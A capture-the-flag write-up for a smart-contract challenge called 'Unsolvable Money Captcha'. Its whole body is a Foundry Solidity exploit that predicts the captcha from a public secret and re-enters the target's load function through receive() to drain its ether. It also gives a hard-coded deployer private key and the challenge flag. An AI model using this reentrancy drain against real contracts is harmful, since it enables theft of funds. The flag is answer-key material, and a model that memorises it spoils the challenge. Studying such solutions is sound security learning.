# Unsolvable Money Captcha

Solved by: @MaanVad3r

## Question:


## Solution:
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IMoney {
    function load(uint256 userProvidedCaptcha) external;
    function save() external payable;
    function secret() external view returns (uint256);
}

interface Icapcha {
    function generateCaptcha(uint256 _secret) external returns (uint256);
}

contract Exploit is Script {
    IMoney public moneyTarget;
    Icapcha public captchaContract;
    uint256 public secret;

    constructor(address _moneyTarget, address _captchaContract) payable {
        moneyTarget = IMoney(_moneyTarget);
        captchaContract = Icapcha(_captchaContract);
        secret = moneyTarget.secret();
    }

    function runExploit() public {
        
        moneyTarget.save{value: 1 ether}();
        execExploit();
    }

    function execExploit() internal {
        uint256 generatedCaptcha = captchaContract.generateCaptcha(secret);
        moneyTarget.load(generatedCaptcha);
    }

    receive() external payable {
        if (address(moneyTarget).balance > 0) {
            execExploit();
        }
    }
}

contract DeployAndExploit is Script {
    function run() external {
        uint256 deployerPrivateKey = 0xfc3d3ccfd6feb0ce3494dd6bc48a7b6e3cf9fbea394e11d7382dbc6f2bfe58bf;
        vm.startBroadcast(deployerPrivateKey);

        
        address moneyContractAddress = 0xfEc63A4aAe93f2EC78F78A83428986205373Dee1;
        address captchaContractAddress = 0x44ED5BC2Cfcd468Bb238477192F7d792eC8a7fDF;

        
        Exploit exploitContract = new Exploit{value: 3 ether}(moneyContractAddress, captchaContractAddress);

        
        exploitContract.runExploit();

        vm.stopBroadcast();
    }
}
```

**Flag:** `TCP1P{retrancy_attack_plus_not_so_random_captcha`
